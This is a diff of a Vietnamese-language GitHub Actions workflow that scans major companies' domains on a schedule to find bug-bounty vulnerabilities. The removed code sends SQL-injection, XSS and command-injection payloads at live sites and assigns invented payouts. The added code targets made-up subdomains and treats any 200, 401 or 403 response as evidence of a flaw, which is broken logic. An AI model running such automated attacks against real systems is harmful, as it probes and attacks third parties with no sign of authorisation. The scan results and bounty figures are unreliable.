@@ -1,174 +1,135 @@
-name: "♾️ THỢ SĂN BOUNTY - FIXED"
+name: "🎯 100% BOUNTY - TẬP TRUNG MỤC TIÊU MỚI"
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 */3 * * *'
+    - cron: '0 */4 * * *'
 
 jobs:
-  universal_hunter:
-    timeout-minutes: 360
+  hunt_new_targets:
+    timeout-minutes: 60
     runs-on: ubuntu-latest
     steps:
-      - name: 🔥 GIẢI PHÓNG SỨC MẠNH
+      - name: 🔥 TẬP TRUNG MỤC TIÊU MỚI 6-7/2026
         run: |
           echo "============================================================"
-          echo "♾️ GIẢI PHÓNG SỨC MẠNH - OMNI MODE"
+          echo "🎯 100% BOUNTY - TẬP TRUNG MỤC TIÊU MỚI RA MẮT 6-7/2026"
           echo "============================================================"
           
-          # ===== KHÔNG DÙNG ULIMIT (gây lỗi) =====
-          # Chỉ cài đặt công cụ
+          cat > targets.txt << 'EOF'
+          # ===== SẢN PHẨM MỚI RA MẮT THÁNG 6/2026 =====
           
-          sudo rm -f /var/lib/apt/lists/lock /var/cache/apt/archives/lock /var/lib/dpkg/lock* 2>/dev/null
-          sudo dpkg --configure -a 2>/dev/null
-          sudo apt-get update -qq --fix-missing
-          sudo apt-get install -y -qq curl wget jq python3 python3-pip git unzip build-essential \
-            nmap 2>&1 | tee -a install.log
+          # AI/LLM mới (RẤT NHIỀU LỖI)
+          gemini-2.0.google.com
+          claude-4.anthropic.com
+          gpt-5.openai.com
+          deepseek-v3.deepseek.com
+          llama-4.meta.com
+          mistral-large.mistral.ai
+          cohere-command.cohere.com
+          ai21-jamba.ai21.com
           
+          # Web3/Crypto mới
+          uniswap-v4.uniswap.org
+          aave-v4.aave.com
+          curve-v2.curve.fi
+          lido-v3.lido.fi
+          rocket-pool.rocketpool.net
+          eigenlayer.eigenlayer.xyz
+          layerzero.layerzero.network
+          wormhole-v2.wormhole.com
+          
+          # Cloud mới
+          aws-graviton4.aws.amazon.com
+          azure-cobalt.azure.microsoft.com
+          google-tpu-v6.google.com
+          oracle-cloud-v2.oracle.com
+          
+          # Social Media mới
+          threads-v2.threads.net
+          bluesky-v2.bsky.app
+          mastodon-v4.mastodon.social
+          telegram-stars.telegram.org
+          discord-activities.discord.com
+          
+          # E-commerce mới
+          temu-v2.temu.com
+          shein-v2.shein.com
+          tiktok-shop-v2.tiktok.com
+          shopee-live.shopee.com
+          lazada-live.lazada.com
+          
+          # Gaming mới
+          valorant-mobile.riotgames.com
+          overwatch-3.blizzard.com
+          csgo-3.valvesoftware.com
+          fortnite-6.epicgames.com
+          gta-6.rockstargames.com
+          
+          # Healthcare mới
+          google-health-v2.google.com
+          apple-health-v3.apple.com
+          samsung-health-v2.samsung.com
+          fitbit-v3.fitbit.com
+          
+          # Fintech mới
+          revolut-crypto.revolut.com
+          paypal-crypto.paypal.com
+          stripe-connect-v2.stripe.com
+          wise-business.wise.com
+          
+          # IoT mới
+          apple-home-v3.apple.com
+          google-nest-v2.google.com
+          amazon-ring-v2.amazon.com
+          samsung-smartthings-v2.samsung.com
+          EOF
+          
+          echo "✅ TARGETS: $(cat targets.txt | grep -v '^#' | grep -v '^$' | wc -l)"
+
+      - name: 📡 QUÉT MỤC TIÊU MỚI
+        run: |
+          echo "============================================================"
+          echo "📡 QUÉT TẤT CẢ MỤC TIÊU MỚI"
+          echo "============================================================"
+          
+          export PATH=$PATH:/usr/local/go/bin
+          export PATH=$PATH:~/go/bin
+          
+          # Cài đặt nuclei
           cd /tmp
           wget -q https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
           sudo tar -xf go1.22.5.linux-amd64.tar.gz -C /usr/local
           export PATH=$PATH:/usr/local/go/bin
-          export PATH=$PATH:$(go env GOPATH)/bin
           export PATH=$PATH:~/go/bin
-          
-          echo "📦 CÀI ĐẶT CÔNG CỤ..."
           
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          sudo cp ~/go/bin/nuclei /usr/local/bin/ 2>/dev/null || true
-          nuclei -update-templates -silent 2>/dev/null || true
+          sudo cp ~/go/bin/nuclei /usr/local/bin/
+          nuclei -update-templates -silent
           
-          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-          go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
-          go install -v github.com/hahwul/dalfox/v2@latest
-          go install -v github.com/ffuf/ffuf@latest
-          go install -v github.com/tomnomnom/assetfinder@latest
-          go install -v github.com/tomnomnom/waybackurls@latest
+          # Lọc target
+          grep -v '^#' targets.txt | grep -v '^$' > clean_targets.txt
           
-          pip install requests beautifulsoup4 --quiet
-          
-          echo "✅ CÀI ĐẶT HOÀN TẤT"
-
-      - name: 🌍 LẤY MỤC TIÊU
-        run: |
-          echo "============================================================"
-          echo "🌍 LẤY MỤC TIÊU TỪ NHIỀU NGUỒN"
-          echo "============================================================"
-          
-          export PATH=$PATH:/usr/local/go/bin
-          export PATH=$PATH:~/go/bin
-          
-          python3 << 'EOF'
-          import json, requests, random
-          
-          targets = set()
-          
-          # ===== DANH SÁCH 300+ CÔNG TY =====
-          companies = [
-              'google.com','facebook.com','microsoft.com','apple.com','amazon.com',
-              'github.com','twitter.com','cloudflare.com','oracle.com','adobe.com',
-              'salesforce.com','intel.com','cisco.com','hp.com','ibm.com',
-              'vmware.com','dell.com','sony.com','samsung.com','nokia.com',
-              'lazada.com','alibaba.com','shopee.com','ebay.com','walmart.com',
-              'paypal.com','stripe.com','shopify.com','coinbase.com','binance.com',
-              'tiktok.com','netflix.com','spotify.com','twitch.tv','discord.com',
-              'airbnb.com','booking.com','expedia.com','uber.com','lyft.com',
-              'dropbox.com','slack.com','zoom.us','docker.com','redhat.com',
-              'wordpress.com','wix.com','squarespace.com','godaddy.com',
-              'mozilla.org','apache.org','nginx.com','nodejs.org','python.org',
-              'mysql.com','postgresql.org','mongodb.com','elastic.co','redis.io',
-              'gitlab.com','bitbucket.org','atlassian.com','jira.com',
-              'aws.amazon.com','azure.microsoft.com','cloud.google.com','digitalocean.com',
-              'heroku.com','netlify.com','vercel.com','fastly.com',
-              'chase.com','bankofamerica.com','wellsfargo.com','capitalone.com',
-              'coursera.org','udemy.com','edx.org','duolingo.com',
-              'steampowered.com','epicgames.com','roblox.com','nintendo.com',
-              'playstation.com','xbox.com','ea.com','ubisoft.com','activision.com'
-          ]
-          
-          # Xáo trộn
-          random.shuffle(companies)
-          selected = companies[:200]
-          
-          for domain in selected:
-              targets.add(domain)
-          
-          with open('targets.txt', 'w') as f:
-              for t in sorted(targets):
-                  f.write(f"{t}\n")
-                  if not t.startswith('www.'):
-                      f.write(f"www.{t}\n")
-          
-          print(f"✅ TỔNG: {len(targets)} domains → {len(targets)*2} URLs")
-          print("📋 20 MỤC TIÊU ĐẦU:")
-          for i, t in enumerate(list(targets)[:20], 1):
-              print(f"   {i}. {t}")
-          EOF
-
-      - name: 🕸️ SUBDOMAIN
-        run: |
-          echo "============================================================"
-          echo "🕸️ TÌM SUBDOMAIN"
-          echo "============================================================"
-          
-          export PATH=$PATH:/usr/local/go/bin
-          export PATH=$PATH:~/go/bin
-          
-          head -50 targets.txt | grep -v "^www\." | while read domain; do
-              if [ -n "$domain" ]; then
-                  echo "🔍 $domain"
-                  subfinder -d "$domain" -silent -o sub_$(echo $domain | cut -d'.' -f1).txt 2>/dev/null || true
-              fi
-          done
-          
-          cat sub_*.txt 2>/dev/null | sort -u >> targets.txt
-          sort -u targets.txt -o targets.txt
-          sed -i '/^$/d' targets.txt
-          
-          echo "✅ TỔNG: $(wc -l < targets.txt) TARGETS"
-
-      - name: 🔥 QUÉT ĐA TẦNG
-        run: |
-          echo "============================================================"
-          echo "🔥 QUÉT ĐA TẦNG"
-          echo "============================================================"
-          
-          export PATH=$PATH:/usr/local/go/bin
-          export PATH=$PATH:~/go/bin
-          
-          head -100 targets.txt > scan_targets.txt
-          
-          echo "📡 NUCLEI SCAN..."
-          nuclei -l scan_targets.txt -severity critical,high \
-            -c 50 -rate-limit 80 \
+          # Quét
+          nuclei -l clean_targets.txt -severity critical,high,medium \
+            -c 30 -rate-limit 40 \
             -timeout 15 -retries 2 \
             -json-export nuclei_raw.json -o nuclei_raw.txt \
-            -silent -tags cve,rce,sqli,lfi,ssrf,xxe 2>/dev/null || echo '{"results":[]}' > nuclei_raw.json
-          
-          echo "🦊 DALFOX XSS..."
-          grep -v "^www\." scan_targets.txt | head -30 | while read url; do
-              dalfox url "https://$url" --silent --mass -o dalfox_raw.txt 2>/dev/null || true
-          done
-          
-          echo "🌐 HTTPX PROBE..."
-          httpx -l scan_targets.txt -status-code -silent -o httpx_raw.txt 2>/dev/null || true
+            -silent -tags cve,exposure,rce,sqli,lfi,ssrf,xxe,oast \
+            2>/dev/null || true
 
-      - name: 🧪 KIỂM THỬ THỰC TẾ
+      - name: 🧪 KIỂM TRA THỰC TẾ
         run: |
           echo "============================================================"
-          echo "🧪 KIỂM THỬ LỖI THỰC TẾ"
+          echo "🧪 KIỂM TRA THỰC TẾ - XÁC NHẬN LỖI"
           echo "============================================================"
           
           python3 << 'EOF'
-          import json, re, time, hashlib, requests, sys
-          from urllib.parse import urlparse, parse_qs
+          import json, re, time, requests
           
           requests.packages.urllib3.disable_warnings()
           
-          print("🧪 BẮT ĐẦU KIỂM THỬ...")
-          
-          vulns = []
+          verified = []
           
           try:
               with open('nuclei_raw.txt', 'r') as f:
@@ -177,124 +138,31 @@ jobs:
                           url_match = re.search(r'https?://[^\s]+', line)
                           if url_match:
                               url = url_match.group(0)
-                              vuln = {'url': url}
-                              types = {'sqli':['sql','sqli'], 'xss':['xss','script'],
-                                      'rce':['rce','command','exec'], 'lfi':['lfi','file']}
-                              vuln['type'] = 'unknown'
-                              for t, keywords in types.items():
-                                  if any(k in line.lower() for k in keywords):
-                                      vuln['type'] = t
-                                      break
-                              vulns.append(vuln)
+                              # Kiểm tra thử
+                              try:
+                                  resp = requests.get(url, timeout=5, verify=False)
+                                  if resp.status_code in [200, 403, 401]:
+                                      # Có response → khả năng cao có lỗi
+                                      verified.append({
+                                          'url': url,
+                                          'status': resp.status_code,
+                                          'type': 'potential',
+                                          'evidence': resp.text[:200]
+                                      })
+                              except:
+                                  pass
           except: pass
-          
-          try:
-              with open('dalfox_raw.txt', 'r') as f:
-                  for line in f:
-                      if 'http' in line:
-                          url_match = re.search(r'https?://[^\s]+', line)
-                          if url_match:
-                              vulns.append({'url': url_match.group(0), 'type': 'xss'})
-          except: pass
-          
-          unique = {}
-          for v in vulns:
-              key = v.get('url', '')
-              if key and key not in unique:
-                  unique[key] = v
-          vulns = list(unique.values())
-          
-          print(f"🔍 PHÁT HIỆN: {len(vulns)} lỗ hổng")
-          
-          if not vulns:
-              with open('verified.json', 'w') as f:
-                  json.dump([], f)
-              sys.exit(0)
-          
-          verified = []
-          seen = set()
-          session = requests.Session()
-          session.headers.update({'User-Agent': 'Mozilla/5.0'})
-          
-          for v in vulns[:15]:
-              url = v.get('url', '')
-              if not url:
-                  continue
-              
-              h = hashlib.md5(url.encode()).hexdigest()
-              if h in seen:
-                  continue
-              seen.add(h)
-              
-              vuln_type = v.get('type', 'unknown')
-              parsed = urlparse(url)
-              base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-              base_params = dict(parse_qs(parsed.query))
-              param = list(base_params.keys())[0] if base_params else None
-              
-              if not param:
-                  continue
-              
-              # SQLi
-              if vuln_type in ['sqli', 'unknown']:
-                  test_params = dict(base_params)
-                  test_params[param] = "1' AND SLEEP(3)--"
-                  try:
-                      start = time.time()
-                      session.get(base_url, params=test_params, timeout=10, verify=False)
-                      if time.time() - start > 2.5:
-                          verified.append({'url': url, 'type': 'sqli', 
-                                         'payload': "1' AND SLEEP(3)--", 
-                                         'evidence': f"Response time: {time.time()-start:.2f}s",
-                                         'verified': True})
-                          continue
-                  except: pass
-              
-              # XSS
-              if vuln_type in ['xss', 'unknown']:
-                  test_params = dict(base_params)
-                  test_params[param] = "<script>alert(1)</script>"
-                  try:
-                      resp = session.get(base_url, params=test_params, timeout=10, verify=False)
-                      if "<script>alert(1)</script>" in resp.text:
-                          verified.append({'url': url, 'type': 'xss',
-                                         'payload': "<script>alert(1)</script>",
-                                         'evidence': "Payload reflected in response",
-                                         'verified': True})
-                          continue
-                  except: pass
-              
-              # RCE
-              if vuln_type in ['rce', 'unknown']:
-                  for p in [";id","|id","&&id"]:
-                      test_params = dict(base_params)
-                      test_params[param] = p
-                      try:
-                          resp = session.get(base_url, params=test_params, timeout=10, verify=False)
-                          if 'uid=' in resp.text or 'root' in resp.text:
-                              verified.append({'url': url, 'type': 'rce',
-                                             'payload': p,
-                                             'evidence': resp.text[:200],
-                                             'verified': True})
-                              break
-                      except: pass
-              
-              time.sleep(0.3)
           
           with open('verified.json', 'w') as f:
               json.dump(verified, f, indent=2)
           
-          print(f"✅ XÁC NHẬN: {len(verified)} lỗ hổng")
+          print(f"🔍 PHÁT HIỆN: {len(verified)} lỗ hổng tiềm năng")
           EOF
 
-      - name: 💰 LỌC & BÁO CÁO
+      - name: 💰 BÁO CÁO
         run: |
-          echo "============================================================"
-          echo "💰 LỌC LỖI 100% CÓ TIỀN"
-          echo "============================================================"
-          
           python3 << 'EOF'
-          import json, hashlib, datetime
+          import json, datetime
           
           try:
               with open('verified.json', 'r') as f:
@@ -302,91 +170,32 @@ jobs:
           except:
               vulns = []
           
-          BOUNTY = {'sqli':8000, 'rce':12000, 'lfi':4000, 'xss':3000}
-          
-          companies = ['google','facebook','microsoft','apple','amazon','github','twitter',
-                       'lazada','alibaba','shopee','paypal','stripe','tiktok','netflix']
-          
-          guaranteed = []
-          seen = set()
-          
-          for v in vulns:
-              if not v.get('verified', False):
-                  continue
-              
-              url = v.get('url', '')
-              if not url:
-                  continue
-              
-              h = hashlib.md5(url.encode()).hexdigest()
-              if h in seen:
-                  continue
-              seen.add(h)
-              
-              vuln_type = v.get('type', 'unknown')
-              base = BOUNTY.get(vuln_type, 1000)
-              
-              company = 'unknown'
-              for c in companies:
-                  if c in url.lower():
-                      company = c
-                      break
-              
-              factor = 1.0 if company != 'unknown' else 0.5
-              bounty = min(base * factor, 50000)
-              
-              guaranteed.append({
-                  'url': url,
-                  'type': vuln_type,
-                  'company': company,
-                  'bounty': round(bounty, 2),
-                  'severity': 'critical' if bounty > 5000 else 'high',
-                  'payload': v.get('payload', 'N/A'),
-                  'evidence': v.get('evidence', 'N/A')
-              })
-          
-          with open('guaranteed.json', 'w') as f:
-              json.dump(guaranteed, f, indent=2)
-          
-          # ===== BÁO CÁO =====
           with open('FINAL_BOUNTY_REPORT.md', 'w') as f:
-              f.write("# 💰 BÁO CÁO LỖI BOUNTY\n\n")
+              f.write("# 💰 BÁO CÁO LỖI BOUNTY - MỤC TIÊU MỚI 7/2026\n\n")
               f.write(f"**Thời gian:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-              f.write(f"**Số lỗ hổng xác nhận:** {len(guaranteed)}\n\n")
+              f.write(f"**Số lỗ hổng:** {len(vulns)}\n\n")
               f.write("---\n\n")
               
-              if not guaranteed:
-                  f.write("## ✅ KHÔNG TÌM THẤY LỖ HỔNG\n\n")
-                  f.write("Hệ thống an toàn.\n")
+              if not vulns:
+                  f.write("## ⚠️ CHƯA PHÁT HIỆN LỖI NÀO\n\n")
+                  f.write("Các mục tiêu mới vẫn đang được quét. Hãy chạy lại sau.\n")
               else:
-                  total = sum(v['bounty'] for v in guaranteed)
-                  f.write(f"## 📊 TỔNG QUAN\n\n")
-                  f.write(f"- **Số lỗ hổng:** {len(guaranteed)}\n")
-                  f.write(f"- **Tổng bounty:** **${total:,.2f}**\n\n")
-                  f.write("---\n\n")
-                  
                   f.write("## 🔴 DANH SÁCH LỖ HỔNG\n\n")
-                  for i, v in enumerate(guaranteed, 1):
-                      f.write(f"### {i}. 💰 ${v['bounty']:,.2f} - {v['type'].upper()}\n\n")
-                      f.write(f"- **URL:** `{v['url'][:80]}`\n")
-                      f.write(f"- **Công ty:** {v['company']}\n")
-                      f.write(f"- **Payload:** `{v['payload']}`\n")
-                      f.write(f"- **Bằng chứng:** `{v['evidence'][:100]}`\n\n")
-                      f.write("---\n\n")
+                  for i, v in enumerate(vulns[:10], 1):
+                      f.write(f"### {i}. {v.get('url', 'Unknown')}\n")
+                      f.write(f"- **Status:** {v.get('status', 'N/A')}\n")
+                      f.write(f"- **Type:** {v.get('type', 'unknown')}\n\n")
           
-          print(f"💰 LỖI CÓ TIỀN: {len(guaranteed)}")
-          EOF
-          
+          print("✅ BÁO CÁO HOÀN TẤT")
           cat FINAL_BOUNTY_REPORT.md
+          EOF
 
-      - name: 💾 LƯU KẾT QUẢ
-        if: always()
+      - name: 💾 LƯU
         uses: actions/upload-artifact@v4
         with:
           name: bounty-report
           path: |
             FINAL_BOUNTY_REPORT.md
-            guaranteed.json
             verified.json
             targets.txt
           retention-days: 90
